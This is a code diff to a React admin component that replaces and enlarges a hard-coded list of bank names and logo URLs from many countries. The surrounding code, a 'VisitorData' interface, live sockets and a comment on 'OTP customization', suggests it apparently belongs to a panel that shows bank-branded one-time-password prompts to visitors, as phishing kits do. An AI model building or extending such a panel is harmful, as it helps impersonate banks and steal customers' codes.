@@ -325,6 +325,26 @@ interface VisitorData {
 
 // Bank logos array with name and logo properties for admin panel selection
 const bankLogos = [
+  // Oman Banks (Priority Display)
+  { name: 'Oman National Bank', logo: 'https://www.nbo.om/Style%20Library/NBO3/images/Logo.png' },
+  { name: 'Bank Muscat', logo: 'https://iconlogovector.com/uploads/images/2025/02/sm-67a9465deaa56-Bank-Muscat.webp' },
+  { name: 'Dhofar Bank', logo: 'https://companieslogo.com/img/orig/BKDB.OM_BIG-ef97d413.png?t=1720244491' },
+  { name: 'Sohar International Bank', logo: 'https://companieslogo.com/img/orig/BKSB.OM_BIG.D-b4e46aac.png?t=1720244491' },
+  { name: 'Oman Arab Bank', logo: 'http://www.creativeaction.co.uk/wp-content/uploads/2016/09/oab-cards-logo.png' },
+  { name: 'Ahli Bank Oman', logo: 'https://companieslogo.com/img/orig/AUB.BH_BIG-326de283.png?t=1720244490' },
+  { name: 'Nizwa Bank', logo: 'https://mgmt.manhom.com/images/77730/1730189732/%D8%A8%D9%86%D9%83-%D9%86%D8%B2%D9%88%D9%89.webp' },
+  { name: 'Alizz Islamic Bank', logo: 'https://storage.promosteer.com/static/images/providers/img_3bc15c16-41d9-5118-530b-9caac76b5614.webp' },
+  
+  // UAE Banks (Priority Display)
+  { name: 'Abu Dhabi Commercial Bank (ADCB)', logo: 'https://uaelogos.ae/storage/886/conversions/Abu-Dhabi-Commercial-Bank-(ADCB)@4x-thumb.png' },
+  { name: 'Abu Dhabi Islamic Bank (ADIB)', logo: 'https://uaelogos.ae/storage/1403/conversions/Abu-Dhabi-Islamic-Bank-(ADIB)-thumb.png' },
+  { name: 'Ajman Bank', logo: 'https://uaelogos.ae/storage/2704/conversions/Ajman-Bank-thumb.png' },
+  { name: 'Al Hilal Bank', logo: 'https://svgmix.com/uploads/b6d94e-al-hilal-bank.svg' },
+  { name: 'Al Maryah Community Bank', logo: 'https://masarif.ae/storage/bank-logos/image_al-maryah-community-20220125151738.png' },
+  { name: 'Bank of Sharjah', logo: 'https://masarif.ae/storage/bank-logos/image_bos20210115232009.png' },
+  { name: 'Emirates Islamic Bank', logo: 'https://vectorseek.com/wp-content/uploads/2023/10/Emirates-Islamic-Bank-Logo-Vector.svg-.png' },
+  { name: 'Emirates NBD Bank', logo: 'https://logowik.com/content/uploads/images/720_emirates_nbd_bank_logo.jpg' },
+  
   // Indian Banks
   { name: 'HDFC Bank', logo: 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png' },
   { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png' },
@@ -368,12 +388,81 @@ const bankLogos = [
   
   // US Banks (from existing admin panel)
   { name: 'PNC Bank', logo: 'https://logos-world.net/wp-content/uploads/2020/04/PNC-Logo.png' },
-  { name: 'Trust Bank', logo: 'https://companieslogo.com/img/orig/TRST-fe5b2b9c.png' },
-  { name: 'Capital One', logo: 'https://logos-world.net/wp-content/uploads/2020/04/Capital-One-Logo.png' },
-  { name: 'TD Bank', logo: 'https://logos-world.net/wp-content/uploads/2020/08/TD-Bank-Logo.png' }
+  { name: 'Federal Bank', logo: 'https://seeklogo.com/images/F/federal-bank-logo-B066FC8487-seeklogo.com.png' },
+  { name: 'IndusInd Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2023/09/indusind-bank-logo-freelogovectors.net_.png' },
+  { name: 'Yes Bank', logo: 'https://logowik.com/content/uploads/images/yes-bank5426.jpg' }
 ];
 
 const Admin = () => {
+  // Bank logos array with name and logo properties for admin panel selection - MOVED INSIDE COMPONENT FOR PROPER ACCESS
+  const bankLogos = [
+    // Oman Banks (Priority Display)
+    { name: 'Oman National Bank', logo: 'https://www.nbo.om/Style%20Library/NBO3/images/Logo.png' },
+    { name: 'Bank Muscat', logo: 'https://iconlogovector.com/uploads/images/2025/02/sm-67a9465deaa56-Bank-Muscat.webp' },
+    { name: 'Dhofar Bank', logo: 'https://companieslogo.com/img/orig/BKDB.OM_BIG-ef97d413.png?t=1720244491' },
+    { name: 'Sohar International Bank', logo: 'https://companieslogo.com/img/orig/BKSB.OM_BIG.D-b4e46aac.png?t=1720244491' },
+    { name: 'Oman Arab Bank', logo: 'http://www.creativeaction.co.uk/wp-content/uploads/2016/09/oab-cards-logo.png' },
+    { name: 'Ahli Bank Oman', logo: 'https://companieslogo.com/img/orig/AUB.BH_BIG-326de283.png?t=1720244490' },
+    { name: 'Nizwa Bank', logo: 'https://mgmt.manhom.com/images/77730/1730189732/%D8%A8%D9%86%D9%83-%D9%86%D8%B2%D9%88%D9%89.webp' },
+    { name: 'Alizz Islamic Bank', logo: 'https://storage.promosteer.com/static/images/providers/img_3bc15c16-41d9-5118-530b-9caac76b5614.webp' },
+    
+    // UAE Banks (Priority Display)
+    { name: 'Abu Dhabi Commercial Bank (ADCB)', logo: 'https://uaelogos.ae/storage/886/conversions/Abu-Dhabi-Commercial-Bank-(ADCB)@4x-thumb.png' },
+    { name: 'Abu Dhabi Islamic Bank (ADIB)', logo: 'https://uaelogos.ae/storage/1403/conversions/Abu-Dhabi-Islamic-Bank-(ADIB)-thumb.png' },
+    { name: 'Ajman Bank', logo: 'https://uaelogos.ae/storage/2704/conversions/Ajman-Bank-thumb.png' },
+    { name: 'Al Hilal Bank', logo: 'https://svgmix.com/uploads/b6d94e-al-hilal-bank.svg' },
+    { name: 'Al Maryah Community Bank', logo: 'https://masarif.ae/storage/bank-logos/image_al-maryah-community-20220125151738.png' },
+    { name: 'Bank of Sharjah', logo: 'https://masarif.ae/storage/bank-logos/image_bos20210115232009.png' },
+    { name: 'Emirates Islamic Bank', logo: 'https://vectorseek.com/wp-content/uploads/2023/10/Emirates-Islamic-Bank-Logo-Vector.svg-.png' },
+    { name: 'Emirates NBD Bank', logo: 'https://logowik.com/content/uploads/images/720_emirates_nbd_bank_logo.jpg' },
+    
+    // Indian Banks
+    { name: 'HDFC Bank', logo: 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png' },
+    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png' },
+    { name: 'Bank of India', logo: 'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png' },
+    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png' },
+    { name: 'Central Bank of India', logo: 'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png' },
+    { name: 'Indian Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png' },
+    { name: 'Indian Overseas Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png' },
+    { name: 'Punjab National Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png' },
+    { name: 'UCO Bank', logo: 'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png' },
+    { name: 'Union Bank of India', logo: 'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png' },
+    { name: 'State Bank of India', logo: 'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp' },
+    { name: 'Axis Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png' },
+    { name: 'ICICI Bank', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
+    { name: 'Bandhan Bank', logo: 'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png' },
+    { name: 'City Union Bank', logo: 'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png' },
+    { name: 'CSB Bank', logo: 'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png' },
+    { name: 'DCB Bank', logo: 'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg' },
+    { name: 'Dhanlaxmi Bank', logo: 'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg' },
+    { name: 'Federal Bank', logo: 'https://assets.stickpng.com/thumbs/627ccab31b2e263b45696aa2.png' },
+    { name: 'IDBI Bank', logo: 'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png' },
+    { name: 'Kotak Mahindra Bank', logo: 'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg' },
+    
+    // Malaysian Banks
+    { name: 'Maybank', logo: 'https://logos-world.net/wp-content/uploads/2023/02/Maybank-Logo-500x281.png' },
+    { name: 'AmBank', logo: 'https://whatthelogo.com/storage/logos/ambank-group-108215.png' },
+    { name: 'CIMB Bank', logo: 'https://logolook.net/wp-content/uploads/2023/12/CIMB-Logo-500x281.png' },
+    
+    // Singapore Banks
+    { name: 'OCBC Bank', logo: 'https://logos-world.net/wp-content/uploads/2023/03/OCBC-Bank-Logo-500x281.png' },
+    
+    // International Banks
+    { name: 'HSBC', logo: 'https://1000logos.net/wp-content/uploads/2017/02/HSBC-symbol-500x148.jpg' },
+    
+    // Israeli Banks
+    { name: 'Bank Hapoalim', logo: 'https://cdn.freelogovectors.net/svg07/bank-hapoalim-logo.svg' },
+    { name: 'Bank Leumi', logo: 'https://upload.wikimedia.org/wikipedia/commons/e/eb/BankLeumiLogoReupload.png' },
+    { name: 'Mizrahi Tefahot Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/6/62/%D7%9C%D7%95%D7%92%D7%95_%D7%A9%D7%9C_%D7%91%D7%A0%D7%A7_%D7%9E%D7%96%D7%A8%D7%97%D7%99-%D7%98%D7%A4%D7%97%D7%95%D7%AA.svg' },
+    { name: 'First International Bank of Israel', logo: 'https://companiesmarketcap.com/img/company-logos/256/FIBI.TA.png' },
+    { name: 'Israel Discount Bank', logo: 'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg' },
+    
+    // US Banks
+    { name: 'JPMorgan Chase', logo: 'https://logos-world.net/wp-content/uploads/2021/02/JPMorgan-Chase-Logo-500x281.png' },
+    { name: 'Bank of America', logo: 'https://logos-world.net/wp-content/uploads/2020/04/Bank-of-America-Logo-500x281.png' },
+    { name: 'Wells Fargo', logo: 'https://logos-world.net/wp-content/uploads/2020/04/Wells-Fargo-Logo-500x281.png' }
+  ];
+
   // Mobile device detection and management
   const [deviceInfo, setDeviceInfo] = useState(detectMobile());
   const [mobileWSManager, setMobileWSManager] = useState<MobileWebSocketManager | null>(null);
@@ -556,61 +645,7 @@ const Admin = () => {
     }
   }, [socket, isConnected]);
 
-  // Bank logos for OTP customization
-  const bankLogos = [
-    { name: 'HDFC Bank', logo: 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png' },
-    { name: 'State Bank of India', logo: 'https://logotyp.us/file/sbi.svg' },
-    { name: 'ICICI Bank', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
-    { name: 'Axis Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg' },
-    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo-500x281.png' },
-    { name: 'Punjab National Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/punjab-national-bank-logo.png' },
-    // Kotak Bank - Multiple logos (randomly selected)
-    { name: 'Kotak Mahindra Bank', logo: 'https://logos-download.com/wp-content/uploads/2016/06/1500px-Logo_of_Kotak_Mahindra_Bank.png' },
-    { name: 'Kotak Mahindra Bank', logo: 'https://upload.wikimedia.org/wikipedia/en/thumb/3/39/Kotak_Mahindra_Group_logo.svg/578px-Kotak_Mahindra_Group_logo.svg.png?20201116103707' },
-    { name: 'Bank of India', logo: 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-India-logo-500x281.png' },
-    { name: 'Federal Bank', logo: 'https://stickypng.com/wp-content/uploads/2023/07/627ccab31b2e263b45696aa2.png' },
-    { name: 'Union Bank', logo: 'https://cdn.pnggallery.com/wp-content/uploads/union-bank-of-india-logo-01.png' },
-    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/images/627cc5c1b2e263b45696a8e.png' },
-    // Canara Bank - Multiple logos (randomly selected)
-    { name: 'Canara Bank', logo: 'https://cdn.freelogovectors.net/svg10/canara-bank-logo-freelogovectors.net_.svg' },
-    { name: 'Canara Bank', logo: 'https://images.seeklogo.com/logo-png/39/3/canara-bank-logo-png_seeklogo-397142.png' },
-    { name: 'Indian Overseas Bank', logo: 'https://assets.stickpng.com/images/627ccc0c1b2e263b45696aac.png' },
-    { name: 'Indian Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/indian-bank-logo.png' },
-    { name: 'IDBI Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/IDBI-Bank-logo-500x281.png' },
-    { name: 'IndusInd Bank', logo: 'https://images.seeklogo.com/logo-png/7/2/indusind-bank-logo-png_seeklogo-71354.png?v=1955232376276339464' },
-    { name: 'Karnataka Bank', logo: 'https://wso2.cachefly.net/wso2/sites/all/images/Karnataka_Bank-logo.png' },
-    { name: 'Yes Bank', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' },
-    
-    // US Banks
-    { name: 'Chase Bank', logo: 'https://assets.stickpng.com/thumbs/60394382d4d69e00040ae03c.png' },
-    { name: 'Bank of America', logo: 'https://dwglogo.com/wp-content/uploads/2016/06/1500px-Logo_of_Bank_of_America.png' },
-    { name: 'Citi Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/Citi-logo-500x281.png' },
-    { name: 'Wells Fargo', logo: 'https://images.seeklogo.com/logo-png/24/2/wells-fargo-logo-png_seeklogo-242550.png' },
-    { name: 'US Bank', logo: 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg' },
-    { name: 'Goldman Sachs', logo: 'https://www.pngall.com/wp-content/uploads/15/Goldman-Sachs-Logo.png' },
-    { name: 'PNC Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/PNC-Bank-logo-500x300.png' },
-    { name: 'Truist Bank', logo: 'https://logodownload.org/wp-content/uploads/2021/04/truist-logo-4.png' },
-    { name: 'Capital One', logo: 'https://brandeps.com/logo-download/C/Capital-One-Financial-logo-vector-01.svg' },
-    { name: 'TD Bank', logo: 'https://brandlogo.org/wp-content/uploads/2024/02/TD-Bank-N.A.-Logo.png' },
-    
-    // Malaysian Banks
-    { name: 'Maybank Malaysia', logo: 'https://logos-world.net/wp-content/uploads/2023/02/Maybank-Logo-500x281.png' },
-    { name: 'AmBank', logo: 'https://whatthelogo.com/storage/logos/ambank-group-108215.png' },
-    { name: 'CIMB Bank', logo: 'https://logolook.net/wp-content/uploads/2023/12/CIMB-Logo-500x281.png' },
-    
-    // Singapore Banks
-    { name: 'OCBC Bank', logo: 'https://logos-world.net/wp-content/uploads/2023/03/OCBC-Bank-Logo-500x281.png' },
-    
-    // International Banks
-    { name: 'HSBC', logo: 'https://1000logos.net/wp-content/uploads/2017/02/HSBC-symbol-500x148.jpg' },
-    
-    // Israeli Banks
-    { name: 'Bank Hapoalim', logo: 'https://cdn.freelogovectors.net/svg07/bank-hapoalim-logo.svg' },
-    { name: 'Bank Leumi', logo: 'https://upload.wikimedia.org/wikipedia/commons/e/eb/BankLeumiLogoReupload.png' },
-    { name: 'Mizrahi Tefahot Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/6/62/%D7%9C%D7%95%D7%92%D7%95_%D7%A9%D7%9C_%D7%91%D7%A0%D7%A7_%D7%9E%D7%96%D7%A8%D7%97%D7%99-%D7%98%D7%A4%D7%97%D7%95%D7%AA.svg' },
-    { name: 'First International Bank', logo: 'https://companiesmarketcap.com/img/company-logos/256/FIBI.TA.png' },
-    { name: 'Israel Discount Bank', logo: 'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg' }
-  ];
+
 
   // Popular world currencies for conversion
   const currencies = [
